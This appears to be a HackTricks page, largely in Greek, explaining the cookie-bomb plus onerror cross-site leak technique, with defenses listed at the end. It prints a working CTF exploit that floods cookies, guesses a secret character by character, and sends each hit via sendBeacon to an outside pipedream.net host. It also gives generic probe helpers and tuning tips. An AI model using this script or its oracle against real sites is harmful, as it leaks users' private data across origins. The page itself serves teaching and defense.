# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Αυτή η τεχνική συνδυάζει:
- Cookie bombing: γέμισμα του browser του θύματος με πολλά/μεγάλα cookies για το target origin έτσι ώστε οι επόμενες αιτήσεις να χτυπήσουν όρια του server/του request (request header size, URL size in redirects, κ.λπ.).
- Error-event oracle: probing a cross-origin endpoint με <script> (ή άλλο subresource) και διάκριση καταστάσεων με onload vs onerror.

Βασική ιδέα
- Βρείτε ένα target endpoint της οποίας η συμπεριφορά διαφέρει για δύο καταστάσεις που θέλετε να ελέγξετε (π.χ., search “hit” vs “miss”).
- Βεβαιωθείτε ότι η διαδρομή “hit” θα προκαλέσει μια βαριά αλυσίδα redirects ή μεγάλο URL ενώ η διαδρομή “miss” παραμένει σύντομη. Φουσκώστε τα request headers χρησιμοποιώντας πολλά cookies έτσι ώστε μόνο η διαδρομή “hit” να κάνει τον server να αποτύχει με ένα HTTP error (π.χ., 431/414/400). Το error αλλάζει το onerror event και γίνεται oracle για XS-Search.

Πότε λειτουργεί αυτό
- Μπορείτε να προκαλέσετε τον browser του θύματος να στείλει cookies στον στόχο (π.χ., τα cookies είναι SameSite=None ή μπορείτε να τα ορίσετε σε first-party context μέσω popup window.open).
- Υπάρχει μια λειτουργία της εφαρμογής που μπορείτε να εκμεταλλευτείτε για να ορίσετε αυθαίρετα cookies (π.χ., “save preference” endpoints που μετατρέπουν ελεγχόμενα ονόματα/τιμές εισόδου σε Set-Cookie) ή για να κάνετε post-auth redirects που ενσωματώνουν δεδομένα ελεγχόμενα από τον επιτιθέμενο στο URL.
- Ο server αντιδρά διαφορετικά στις δύο καταστάσεις και, με φουσκωμένα headers/URL, μία κατάσταση ξεπερνά ένα όριο και επιστρέφει ένα error response που ενεργοποιεί το onerror.

Σημείωση σχετικά με τα server errors που χρησιμοποιούνται ως oracle
- 431 Request Header Fields Too Large επιστρέφεται συχνά όταν τα cookies φουσκώνουν τα request headers· 414 URI Too Long ή ένα server-specific 400 μπορεί να επιστραφεί για πολύ μεγάλα request targets. Οποιοδήποτε από αυτά έχει ως αποτέλεσμα αποτυχία φόρτωσης του subresource και εκτέλεση του onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Το παρακάτω script (από δημόσια writeup) εκμεταλλεύεται μια λειτουργία που επιτρέπει στον επιτιθέμενο να εισάγει αυθαίρετα cookies, και στη συνέχεια φορτώνει ένα cross-origin search endpoint ως script. Όταν το query είναι σωστό, ο server πραγματοποιεί redirect που, μαζί με το φούσκωμα των cookies, υπερβαίνει τα όρια του server και επιστρέφει status error, οπότε το script.onerror ενεργοποιείται· αλλιώς δεν συμβαίνει τίποτα.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Γιατί το popup (window.open)?
- Οι σύγχρονοι browsers μπλοκάρουν όλο και περισσότερο third-party cookies. Το άνοιγμα ενός top-level window προς τον target κάνει τα cookies first‑party, οπότε οι Set-Cookie απαντήσεις από τον target θα εφαρμοστούν, επιτρέποντας το cookie-bomb βήμα ακόμα και με περιορισμούς στα third‑party cookies.

2024–2025 notes on cookie availability
- Τα Chromium-based browsers εξακολουθούν συνήθως να στέλνουν third‑party cookies εκτός αν ο χρήστης ή ο site επιλέξει διαφορετικά, αλλά το Safari και το Firefox μπλοκάρουν τα περισσότερα third‑party cookies από προεπιλογή. Προετοιμαστείτε για τα δύο: (1) χρησιμοποιήστε ένα first‑party cookie planting flow (window.open + auto-submit σε ένα cookie-setting endpoint) και μετά (2) κάντε probe με ένα subresource που επιτυγχάνει μόνο όταν αυτά τα cookies αποστέλλονται. Αν τα third‑party cookies είναι μπλοκαρισμένα, μεταφέρετε το probe σε ένα same-site context (π.χ. τρέξτε το oracle στο popup μέσω ενός same-site gadget και exfiltrate το boolean με postMessage ή ένα beacon προς τον server σας).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Εναλλακτικός tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Προχωρημένο: de Bruijn–based cookie packing (CTF-proven)
- Όταν η εφαρμογή σας επιτρέπει να ελέγχετε μεγάλες τιμές cookie, μπορείτε να συσκευάσετε τις υποθέσεις αποδοτικά προσθέτοντας μια de Bruijn sequence σε κάθε probe. Αυτό διατηρεί το per-probe overhead μικρό ενώ διασφαλίζει ότι το heavy branch είναι σταθερά βαρύτερο μόνο για το σωστό prefix. Παράδειγμα generator για |Σ| σύμβολα μήκους n (ταιριάζει σε μια cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Ιδέα στην πράξη: θέστε πολλαπλά cookies των οποίων οι τιμές είναι prefix + deBruijn(k,n). Μόνο όταν το ελεγμένο prefix είναι σωστό ο server παίρνει το «βαρύ» μονοπάτι (π.χ. επιπλέον redirect που αντικατοπτρίζει το μεγάλο cookie ή URL), το οποίο, σε συνδυασμό με το cookie bloat, υπερβαίνει τα όρια και αναστρέφει το onerror. Δείτε έναν δημόσιο solver του LA CTF 2024 που χρησιμοποιεί αυτή την προσέγγιση.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using window.open loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
- SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
- Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
- X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
- Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
- Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
- Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
